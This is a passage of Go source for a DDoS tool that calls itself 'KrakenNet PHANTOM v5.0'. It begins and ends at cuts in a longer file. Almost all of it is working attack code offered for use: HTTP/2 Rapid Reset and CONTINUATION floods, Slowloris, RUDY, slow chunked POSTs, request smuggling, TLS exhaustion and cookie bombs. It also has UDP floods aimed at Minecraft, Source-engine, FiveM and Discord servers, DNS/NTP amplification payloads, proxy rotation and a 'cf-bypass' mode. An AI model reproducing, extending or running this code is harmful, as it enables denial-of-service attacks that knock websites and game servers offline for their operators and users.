	var cookies strings.Builder
	for i := 0; i < 500; i++ {
		cookies.WriteString("c" + strconv.Itoa(i) + "=" + randString(100) + "; ")
	}
	req.Header.Set("Cookie", cookies.String())
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func tlsExhaustOnce(host, p string) error {
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return err
	}
	defer rawConn.Close()
	tlsConfig := randomTLSConfig(host)
	tlsConn := tls.Client(rawConn, tlsConfig)
	if err := tlsConn.Handshake(); err != nil {
		return err
	}
	atomic.AddInt64(&totalSuccess, 1)
	atomic.AddInt64(&totalReq, 1)
	time.Sleep(time.Duration(50+rand.Intn(200)) * time.Millisecond)
	return nil
}

func httpSmuggleOnce(targetURL string) error {
	scheme, host, p, path := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return err
	}
	var conn net.Conn = rawConn
	if scheme != "http" {
		tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
		if err := tlsConn.Handshake(); err != nil {
			rawConn.Close()
			return err
		}
		conn = tlsConn
	}
	defer conn.Close()

	innerBody := fmt.Sprintf("POST /admin HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n\r\n%s",
		host, rand.Intn(100)+10, randString(rand.Intn(100)+10))
	outerLen := len(innerBody) + 6
	payload := fmt.Sprintf(
		"POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n%s",
		path, host, randomUserAgent(), outerLen, innerBody,
	)
	conn.Write([]byte(payload))
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalSuccess, 1)
	atomic.AddInt64(&totalBytes, int64(len(payload)))
	return nil
}

func idleH2Once(targetURL string) error {
	scheme, host, p, path := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return err
	}
	tlsConn := tls.Client(rawConn, &tls.Config{
		ServerName: host, NextProtos: []string{"h2"}, InsecureSkipVerify: true,
	})
	if err := tlsConn.Handshake(); err != nil {
		rawConn.Close()
		return err
	}
	defer tlsConn.Close()
	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		return fmt.Errorf("h2 not negotiated")
	}
	tlsConn.Write([]byte(http2.ClientPreface))
	bw := bufio.NewWriterSize(tlsConn, 65536)
	framer := http2.NewFramer(bw, tlsConn)
	framer.AllowIllegalWrites = true
	framer.WriteSettings(
		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 2000},
		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
	)
	bw.Flush()
	go func() {
		for {
			if _, err := framer.ReadFrame(); err != nil {
				return
			}
		}
	}()

	var hdrBuf bytes.Buffer
	enc := hpack.NewEncoder(&hdrBuf)
	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
	enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randomUserAgent()})
	fragment := append([]byte(nil), hdrBuf.Bytes()...)

	var streamID uint32 = 1
	for i := 0; i < 200; i++ {
		framer.WriteHeaders(http2.HeadersFrameParam{
			StreamID:      streamID,
			BlockFragment: fragment,
			EndStream:     false,
			EndHeaders:    true,
		})
		atomic.AddInt64(&totalReq, 1)
		atomic.AddInt64(&totalSuccess, 1)
		streamID += 2
		if streamID >= 1<<31-1 {
			break
		}
	}
	bw.Flush()
	time.Sleep(2 * time.Second)
	return nil
}

type slowReader struct {
	data  []byte
	pos   int
	delay time.Duration
	stop  <-chan struct{}
}

func (r *slowReader) Read(p []byte) (int, error) {
	select {
	case <-r.stop:
		return 0, io.EOF
	default:
	}
	if r.pos >= len(r.data) {
		r.pos = 0
	}
	p[0] = r.data[r.pos]
	r.pos++
	time.Sleep(r.delay)
	return 1, nil
}

type chunkDripReader struct {
	stop <-chan struct{}
}

func (r *chunkDripReader) Read(p []byte) (int, error) {
	select {
	case <-r.stop:
		return 0, io.EOF
	case <-time.After(time.Duration(500+rand.Intn(1500)) * time.Millisecond):
		n := copy(p, []byte(randString(10)))
		return n, nil
	}
}

func rudyRequest(client *http.Client, targetURL string, stop <-chan struct{}) bool {
	declaredSize := 1024*1024 + rand.Intn(50*1024*1024)
	chunk := []byte("comment=" + randString(50) + "&" + randString(10) + "=" + randString(20) + "&")
	slow := &slowReader{
		data:  chunk,
		delay: time.Duration(500+rand.Intn(2000)) * time.Millisecond,
		stop:  stop,
	}
	req, err := http.NewRequest("POST", targetURL+randomPath(), slow)
	if err != nil {
		return false
	}
	req.ContentLength = int64(declaredSize)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Referer", randomReferer())
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func chunkPostRequest(client *http.Client, targetURL string, stop <-chan struct{}) bool {
	body := io.NopCloser(&chunkDripReader{stop: stop})
	req, err := http.NewRequest("POST", targetURL+randomPath(), body)
	if err != nil {
		return false
	}
	req.ContentLength = -1
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Connection", "keep-alive")
	atomic.AddInt64(&totalReq, 1)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

func rapidResetOnce(targetURL string) error {
	scheme, host, p, path := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return err
	}
	tlsConn := tls.Client(rawConn, &tls.Config{
		ServerName: host, NextProtos: []string{"h2"}, InsecureSkipVerify: true,
	})
	if err := tlsConn.Handshake(); err != nil {
		rawConn.Close()
		return err
	}
	defer tlsConn.Close()
	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		return fmt.Errorf("h2 not negotiated")
	}
	tlsConn.Write([]byte(http2.ClientPreface))
	bw := bufio.NewWriterSize(tlsConn, 65536)
	framer := http2.NewFramer(bw, tlsConn)
	framer.AllowIllegalWrites = true

	var writeMu sync.Mutex
	writeMu.Lock()
	framer.WriteSettings(
		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
	)
	bw.Flush()
	writeMu.Unlock()

	done := make(chan struct{})
	go func() {
		defer close(done)
		for {
			f, err := framer.ReadFrame()
			if err != nil {
				return
			}
			if sf, ok := f.(*http2.SettingsFrame); ok {
				if !sf.IsAck() {
					writeMu.Lock()
					framer.WriteSettingsAck()
					bw.Flush()
					writeMu.Unlock()
				}
			}
		}
	}()

	var hdrBuf bytes.Buffer
	enc := hpack.NewEncoder(&hdrBuf)
	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
	enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randomUserAgent()})
	fragment := append([]byte(nil), hdrBuf.Bytes()...)

	var streamID uint32 = 1
	for i := 0; i < 100; i++ {
		select {
		case <-done:
			return fmt.Errorf("connection closed")
		default:
		}
		writeMu.Lock()
		err1 := framer.WriteHeaders(http2.HeadersFrameParam{
			StreamID:      streamID,
			BlockFragment: fragment,
			EndStream:     true,
			EndHeaders:    true,
		})
		err2 := framer.WriteRSTStream(streamID, http2.ErrCodeCancel)
		bw.Flush()
		writeMu.Unlock()
		if err1 != nil || err2 != nil {
			return fmt.Errorf("write error")
		}
		atomic.AddInt64(&totalReq, 1)
		atomic.AddInt64(&totalSuccess, 1)
		atomic.AddInt64(&totalBytes, int64(len(fragment)+18))
		streamID += 2
		if streamID >= 1<<31-1 {
			break
		}
	}
	time.Sleep(10 * time.Millisecond)
	return nil
}

func h2ContOnce(targetURL string) error {
	scheme, host, p, path := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return err
	}
	tlsConn := tls.Client(rawConn, &tls.Config{
		ServerName: host, NextProtos: []string{"h2"}, InsecureSkipVerify: true,
	})
	if err := tlsConn.Handshake(); err != nil {
		rawConn.Close()
		return err
	}
	defer tlsConn.Close()
	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		return fmt.Errorf("h2 not negotiated")
	}
	tlsConn.Write([]byte(http2.ClientPreface))
	bw := bufio.NewWriterSize(tlsConn, 65536)
	framer := http2.NewFramer(bw, tlsConn)
	framer.AllowIllegalWrites = true
	framer.WriteSettings()
	bw.Flush()
	go func() {
		for {
			if _, err := framer.ReadFrame(); err != nil {
				return
			}
		}
	}()

	var hdrBuf bytes.Buffer
	enc := hpack.NewEncoder(&hdrBuf)
	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
	enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: randomUserAgent()})
	fragment := append([]byte(nil), hdrBuf.Bytes()...)

	if err := framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      1,
		BlockFragment: fragment,
		EndStream:     false,
		EndHeaders:    false,
	}); err != nil {
		return err
	}
	for i := 0; i < 2000; i++ {
		if err := framer.WriteContinuation(1, false, fragment); err != nil {
			bw.Flush()
			return nil
		}
		atomic.AddInt64(&totalSuccess, 1)
		atomic.AddInt64(&totalBytes, int64(len(fragment)))
	}
	bw.Flush()
	return nil
}

func slowlorisOnce(targetURL string, stop <-chan struct{}) bool {
	scheme, host, p, _ := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return false
	}
	var conn net.Conn = rawConn
	if scheme != "http" {
		tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
		if err := tlsConn.Handshake(); err != nil {
			rawConn.Close()
			return false
		}
		conn = tlsConn
	}
	fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", randomPath(), host, randomUserAgent())
	ticker := time.NewTicker(time.Duration(1+rand.Intn(3)) * time.Second)
	defer ticker.Stop()
	alive := true
	for alive {
		select {
		case <-stop:
			conn.Close()
			return true
		case <-ticker.C:
			_, err := fmt.Fprintf(conn, "X-%s: %s\r\n", randString(5), randString(20))
			if err != nil {
				alive = false
				break
			}
			atomic.AddInt64(&totalSuccess, 1)
		}
	}
	conn.Close()
	return false
}

func malformedOnce(targetURL string) error {
	scheme, host, p, _ := parseTarget(targetURL)
	rawConn, err := dialTarget(host, p)
	if err != nil {
		return err
	}
	var conn net.Conn = rawConn
	if scheme != "http" {
		tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
		if err := tlsConn.Handshake(); err != nil {
			rawConn.Close()
			return err
		}
		conn = tlsConn
	}
	longURL := "/" + randString(8192+rand.Intn(8192))
	payload := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n\r\n",
		longURL, host, randomUserAgent())
	conn.Write([]byte(payload))
	conn.Close()
	atomic.AddInt64(&totalReq, 1)
	atomic.AddInt64(&totalSuccess, 1)
	atomic.AddInt64(&totalBytes, int64(len(payload)))
	return nil
}

func generatePayload(size int) []byte {
	payload := make([]byte, size)
	rand.Read(payload)
	return payload
}

func writeVarInt(buf *bytes.Buffer, value int32) {
	for {
		temp := byte(value & 0x7F)
		value >>= 7
		if value != 0 {
			temp |= 0x80
		}
		buf.WriteByte(temp)
		if value == 0 {
			break
		}
	}
}

func minecraftWorker(ctx context.Context, host string, mcPort int) {
	addr := fmt.Sprintf("%s:%d", host, mcPort)
	for {
		select {
		case <-ctx.Done():
			return
		default:
			conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
			if err != nil {
				continue
			}
			for _, proto := range []int32{754, 759, 760, 762, 763, 765} {
				buf := new(bytes.Buffer)
				writeVarInt(buf, proto)
				writeVarInt(buf, int32(len(host)))
				buf.WriteString(host)
				binary.Write(buf, binary.BigEndian, uint16(mcPort))
				writeVarInt(buf, 1)
				handshakePacket := new(bytes.Buffer)
				writeVarInt(handshakePacket, int32(buf.Len()+1))
				handshakePacket.WriteByte(0x00)
				handshakePacket.Write(buf.Bytes())
				conn.Write(handshakePacket.Bytes())
			}
			statusBuf := new(bytes.Buffer)
			writeVarInt(statusBuf, 1)
			statusBuf.WriteByte(0x00)
			conn.Write(statusBuf.Bytes())
			io.Copy(io.Discard, conn)
			conn.Close()
			atomic.AddInt64(&totalSuccess, 1)
		}
	}
}

type GMODWorker struct {
	Target string
	Port   int
}

func (gw *GMODWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", gw.Target, gw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	payloads := [][]byte{
		[]byte("\xff\xff\xff\xff\x54Source Engine Query\x00"),
		[]byte("\xff\xff\xff\xff\x56\x00\x00\x00\x00"),
		[]byte("\xff\xff\xff\xff\x55\xff\xff\xff\xff"),
	}
	for {
		select {
		case <-ctx.Done():
			return
		default:
			p := payloads[rand.Intn(len(payloads))]
			if _, err := conn.Write(p); err == nil {
				atomic.AddInt64(&totalSuccess, 1)
				atomic.AddInt64(&totalBytes, int64(len(p)))
			} else {
				atomic.AddInt64(&totalFail, 1)
			}
		}
	}
}

type CS2Worker struct {
	Target string
	Port   int
}

func (cw *CS2Worker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", cw.Target, cw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	a2sInfo := []byte("\xff\xff\xff\xffTSource Engine Query\x00")
	for {
		select {
		case <-ctx.Done():
			return
		default:
			if _, err := conn.Write(a2sInfo); err == nil {
				atomic.AddInt64(&totalSuccess, 1)
				atomic.AddInt64(&totalBytes, int64(len(a2sInfo)))
			} else {
				atomic.AddInt64(&totalFail, 1)
			}
			time.Sleep(time.Duration(rand.Intn(5)) * time.Millisecond)
		}
	}
}

type FivemWorker struct {
	Target string
	Port   int
	Burst  int
}

func (fw *FivemWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", fw.Target, fw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	payloads := [][]byte{
		[]byte("\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"),
		[]byte("\xff\xff\xff\xffgetchallenge\x00\x00\x00"),
		[]byte("\xff\xff\xff\xffgetstatus\x00\x00\x00"),
	}
	for {
		select {
		case <-ctx.Done():
			return
		default:
			p := payloads[rand.Intn(len(payloads))]
			for i := 0; i < fw.Burst; i++ {
				if _, err := conn.Write(p); err == nil {
					atomic.AddInt64(&totalSuccess, 1)
					atomic.AddInt64(&totalBytes, int64(len(p)))
				} else {
					atomic.AddInt64(&totalFail, 1)
				}
			}
		}
	}
}

type UDPDiscordWorker struct {
	Target string
	Port   int
}

func (uw *UDPDiscordWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", uw.Target, uw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	for {
		select {
		case <-ctx.Done():
			return
		default:
			payload := discordPayloads[rand.Intn(len(discordPayloads))]
			if _, err := conn.Write(payload); err == nil {
				atomic.AddInt64(&totalSuccess, 1)
				atomic.AddInt64(&totalBytes, int64(len(payload)))
			} else {
				atomic.AddInt64(&totalFail, 1)
			}
		}
	}
}

type UDPBypassWorker struct {
	Target string
	Port   int
}

func (uw *UDPBypassWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", uw.Target, uw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	for {
		select {
		case <-ctx.Done():
			return
		default:
			size := rand.Intn(1200) + 50
			payload := generatePayload(size)
			switch rand.Intn(4) {
			case 0:
				payload[0] = 0xFF; payload[1] = 0xFF; payload[2] = 0xFF; payload[3] = 0xFF
			case 1:
				copy(payload, []byte("\x00\x00\x00\x00"))
			case 2:
				copy(payload, []byte("TE\x00\x00"))
			}
			if _, err := conn.Write(payload); err == nil {
				atomic.AddInt64(&totalSuccess, 1)
				atomic.AddInt64(&totalBytes, int64(size))
			} else {
				atomic.AddInt64(&totalFail, 1)
			}
		}
	}
}

type UDPGbpsWorker struct {
	Target string
	Port   int
	Size   int
}

func (uw *UDPGbpsWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", uw.Target, uw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	payload := generatePayload(uw.Size)
	for {
		select {
		case <-ctx.Done():
			return
		default:
			if _, err := conn.Write(payload); err == nil {
				atomic.AddInt64(&totalSuccess, 1)
				atomic.AddInt64(&totalBytes, int64(uw.Size))
			} else {
				atomic.AddInt64(&totalFail, 1)
			}
		}
	}
}

type UDPAmpWorker struct {
	Target string
	Port   int
}

func (uw *UDPAmpWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	addr := fmt.Sprintf("%s:%d", uw.Target, uw.Port)
	conn, err := net.Dial("udp", addr)
	if err != nil {
		return
	}
	defer conn.Close()
	payloads := [][]byte{
		[]byte("\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x01"),
		[]byte("\x00\x2b\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04pool\x03ntp\x03org\x00\x00\x01\x00\x01"),
		[]byte("\x26\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
	}
	for {
		select {
		case <-ctx.Done():
			return
		default:
			p := payloads[rand.Intn(len(payloads))]
			if _, err := conn.Write(p); err == nil {
				atomic.AddInt64(&totalSuccess, 1)
				atomic.AddInt64(&totalBytes, int64(len(p)))
			} else {
				atomic.AddInt64(&totalFail, 1)
			}
		}
	}
}

type WsFloodWorker struct {
	Target string
}

func (ww *WsFloodWorker) Start(ctx context.Context, wg *sync.WaitGroup) {
	defer wg.Done()
	wsURL := ww.Target
	if strings.HasPrefix(wsURL, "http://") {
		wsURL = "ws://" + wsURL[7:]
	} else if strings.HasPrefix(wsURL, "https://") {
		wsURL = "wss://" + wsURL[8:]
	} else if !strings.HasPrefix(wsURL, "ws://") && !strings.HasPrefix(wsURL, "wss://") {
		wsURL = "wss://" + wsURL
	}
	var proxyURL *url.URL
	if len(proxies) > 0 {
		if p, err := url.Parse(proxies[rand.Intn(len(proxies))]); err == nil {
			proxyURL = p
		}
	}
	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
		TLSClientConfig:  &tls.Config{InsecureSkipVerify: true},
	}
	if proxyURL != nil {
		dialer.Proxy = func(req *http.Request) (*url.URL, error) { return proxyURL, nil }
	}
	headers := http.Header{}
	headers.Set("User-Agent", randomUserAgent())
	headers.Set("Origin", ww.Target)
	headers.Set("Accept-Language", randomAcceptLanguage())
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		conn, _, err := dialer.Dial(wsURL, headers)
		if err != nil {
			atomic.AddInt64(&totalFail, 1)
			continue
		}
		go func() {
			for {
				if _, _, err := conn.ReadMessage(); err != nil {
					return
				}
			}
		}()
	inner:
		for {
			select {
			case <-ctx.Done():
				conn.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
				conn.Close()
				return
			default:
			}
			var werr error
			switch rand.Intn(6) {
			case 0:
				msg := fmt.Sprintf(`{"action":"%s","data":"%s","ts":%d}`, randString(8), randString(200+rand.Intn(2000)), time.Now().UnixNano())
				werr = conn.WriteMessage(websocket.TextMessage, []byte(msg))
			case 1:
				data := make([]byte, 1024+rand.Intn(7168))
				rand.Read(data)
				werr = conn.WriteMessage(websocket.BinaryMessage, data)
			case 2:
				werr = conn.WriteMessage(websocket.PingMessage, []byte(randString(16)))
			case 3:
				werr = conn.WriteMessage(websocket.TextMessage, []byte(randString(10240+rand.Intn(40960))))
			case 4:
				for j := 0; j < 10; j++ {
					if e := conn.WriteMessage(websocket.TextMessage, []byte(randString(16))); e != nil {
						werr = e
						break
					}
					atomic.AddInt64(&totalSuccess, 1)
				}
			case 5:
				payload := fmt.Sprintf(`{"event":"subscribe","channels":["%s","%s","%s"]}`,
					randString(12), randString(12), randString(12))
				werr = conn.WriteMessage(websocket.TextMessage, []byte(payload))
			}
			if werr != nil {
				atomic.AddInt64(&totalFail, 1)
				conn.Close()
				break inner
			}
			atomic.AddInt64(&totalSuccess, 1)
		}
	}
}

type requestFunc func(client *http.Client, url string) bool

func spawnRequestWorkers(ctx context.Context, wg *sync.WaitGroup, url string, fn requestFunc) {
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := newHTTPClientTLSWithProxy(randomFromList(proxies, ""), connections)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					for j := 0; j < connections; j++ {
						if fn(client, url) {
							atomic.AddInt64(&totalSuccess, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}
		}()
	}
}

func updatePeakRPS(current float64) {
	statsMu.Lock()
	if current > peakRPS {
		peakRPS = current
	}
	rpsHistory[rpsIdx%30] = current
	rpsIdx++
	statsMu.Unlock()
}

func avgRPS() float64 {
	statsMu.Lock()
	defer statsMu.Unlock()
	var sum float64
	count := rpsIdx
	if count > 30 {
		count = 30
	}
	for i := 0; i < count; i++ {
		sum += rpsHistory[i]
	}
	if count == 0 {
		return 0
	}
	return sum / float64(count)
}

func rpsBar(current, peak float64, width int) string {
	if peak == 0 {
		return strings.Repeat("░", width)
	}
	filled := int(current / peak * float64(width))
	if filled > width {
		filled = width
	}
	bar := ""
	for i := 0; i < width; i++ {
		if i < filled {
			if i < width/3 {
				bar += Green + "█" + Reset
			} else if i < width*2/3 {
				bar += Yellow + "█" + Reset
			} else {
				bar += Red + "█" + Reset
			}
		} else {
			bar += Gray + "░" + Reset
		}
	}
	return bar
}

func statsReporter(ctx context.Context) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	lastTick = time.Now()
	lastReq = 0
	for {
		select {
		case <-ctx.Done():
			return
		case t := <-ticker.C:
			reqs := atomic.LoadInt64(&totalReq)
			ok := atomic.LoadInt64(&totalSuccess)
			fail := atomic.LoadInt64(&totalFail)
			data := atomic.LoadInt64(&totalBytes)
			elapsed := t.Sub(attackStart).Seconds()
			if elapsed < 1 {
				elapsed = 1
			}

			tickDur := t.Sub(lastTick).Seconds()
			if tickDur < 0.001 {
				tickDur = 1
			}
			currentRPS := float64(reqs-lastReq) / tickDur
			updatePeakRPS(currentRPS)
			lastReq = reqs
			lastTick = t

			remaining := float64(durationSec) - elapsed
			if remaining < 0 {
				remaining = 0
			}

			bar := rpsBar(currentRPS, peakRPS, 20)
			successRate := 0.0
			if ok+fail > 0 {
				successRate = float64(ok) / float64(ok+fail) * 100
			}

			var goroutines int = runtime.NumGoroutine()

			line := fmt.Sprintf(
				"\r%s│%s RPS:%s%-8.0f%s [%s] %sPeak:%-8.0f%s │%s OK:%-8d%s │%s FAIL:%-6d%s │%s %.1f%%%s │%s BW:%s/s%s │%s T-%ss%s │%s G:%d%s     ",
				Cyan, Reset,
				BGreen, currentRPS, Reset,
				bar,
				BYellow, peakRPS, Reset,
				BGreen, ok, Reset,
				BRed, fail, Reset,
				BWhite, successRate, Reset,
				Blue, formatBytes(float64(data)/elapsed), Reset,
				Yellow, fmt.Sprintf("%.0f", remaining), Reset,
				Gray, goroutines, Reset,
			)
			fmt.Print(line)
		}
	}
}

func mparam(label, value, vcolor string) {
	content := " " + White + label + Reset + " : " + vcolor + value + Reset
	pad := 52 - len(label) - len(value)
	if pad < 1 {
		pad = 1
	}
	fmt.Println(Cyan + "║" + Reset + content + strings.Repeat(" ", pad) + Cyan + "║" + Reset)
}

func fparam(label, value string) {
	content := " " + White + label + Reset + " : " + BWhite + value + Reset
	pad := 52 - len(label) - len(value)
	if pad < 1 {
		pad = 1
	}
	fmt.Println(Magenta + "║" + Reset + content + strings.Repeat(" ", pad) + Magenta + "║" + Reset)
}

func printFinalStats(mode string) {
	elapsed := time.Since(attackStart).Seconds()
	if elapsed < 1 {
		elapsed = 1
	}
	reqs := atomic.LoadInt64(&totalReq)
	ok := atomic.LoadInt64(&totalSuccess)
	fail := atomic.LoadInt64(&totalFail)
	data := atomic.LoadInt64(&totalBytes)

	successRate := 0.0
	if ok+fail > 0 {
		successRate = float64(ok) / float64(ok+fail) * 100
	}

	fmt.Println()
	fmt.Println(Magenta + "╔" + strings.Repeat("═", 56) + "╗" + Reset)
	fmt.Println(Magenta + "║" + Reset + "  " + Magenta + "FINAL STATISTICS — PHANTOM v5.0" + Reset + strings.Repeat(" ", 23) + Magenta + "║" + Reset)
	fmt.Println(Magenta + "╠" + strings.Repeat("═", 56) + "╣" + Reset)
	fparam("Method", mode)
	fparam("Duration", fmt.Sprintf("%.0f seconds", elapsed))
	fparam("Total Requests", strconv.FormatInt(reqs, 10))
	fparam("Successful", strconv.FormatInt(ok, 10))
	fparam("Failed", strconv.FormatInt(fail, 10))
	fparam("Success Rate", fmt.Sprintf("%.2f%%", successRate))
	fparam("Data Sent", formatBytes(float64(data)))
	fparam("Avg RPS", fmt.Sprintf("%.2f req/s", float64(reqs)/elapsed))
	fparam("Peak RPS", fmt.Sprintf("%.2f req/s", peakRPS))
	fparam("Bandwidth", formatBytes(float64(data)/elapsed)+"/s")
	fmt.Println(Magenta + "╚" + strings.Repeat("═", 56) + "╝" + Reset)
	fmt.Println()
	fmt.Println(BGreen + "[+] Attack completed — KrakenNet PHANTOM v5.0" + Reset)
}

var phantomMethods = []string{
	"kraken", "api-flood", "cf-bypass", "rapid-reset",
	"header-flood", "mixpost", "cache-bust", "phantom-get",
	"h2-cont", "cookie-bomb", "malformed",
}

func launchWorkers(ctx context.Context, wg *sync.WaitGroup, mode, hostName string) {
	switch mode {
	case "tls", "kraken":
		spawnRequestWorkers(ctx, wg, target, sendTLSRequest)

	case "http-flood":
		spawnRequestWorkers(ctx, wg, "http://"+hostName, sendTLSRequest)

	case "https-flood":
		spawnRequestWorkers(ctx, wg, target, sendTLSRequest)

	case "api-flood":
		spawnRequestWorkers(ctx, wg, target, apiFloodRequest)

	case "header-flood":
		spawnRequestWorkers(ctx, wg, target, headerFloodRequest)

	case "mixpost":
		spawnRequestWorkers(ctx, wg, target, mixPostRequest)

	case "cf-bypass":
		spawnRequestWorkers(ctx, wg, target, cfBypassRequest)

	case "range":
		spawnRequestWorkers(ctx, wg, target, rangeRequest)

	case "cookie-bomb":
		spawnRequestWorkers(ctx, wg, target, cookieBombRequest)

	case "cache-bust":
		spawnRequestWorkers(ctx, wg, target, cacheBustRequest)

	case "phantom-get":
		spawnRequestWorkers(ctx, wg, target, phantomGetRequest)

	case "tls-exhaust":
		_, host, p, _ := parseTarget(target)
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := tlsExhaustOnce(host, p); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}

	case "http-smuggle":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := httpSmuggleOnce(target); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}

	case "idle-h2":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if err := idleH2Once(target); err != nil {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}

	case "slowloris":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if slowlorisOnce(target, ctx.Done()) {
							atomic.AddInt64(&totalReq, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}

	case "rudy":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				client := newNoTimeoutClient()
				for {
					select {
					case <-ctx.Done():
						return
					default:
						if rudyRequest(client, target, ctx.Done()) {
							atomic.AddInt64(&totalSuccess, 1)
						} else {
							atomic.AddInt64(&totalFail, 1)
						}
					}
				}
			}()
		}

	case "chunk-post":
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				client := newNoTimeoutClient()
				for {
					select {
					case <-ctx.Done():
						return
					default:
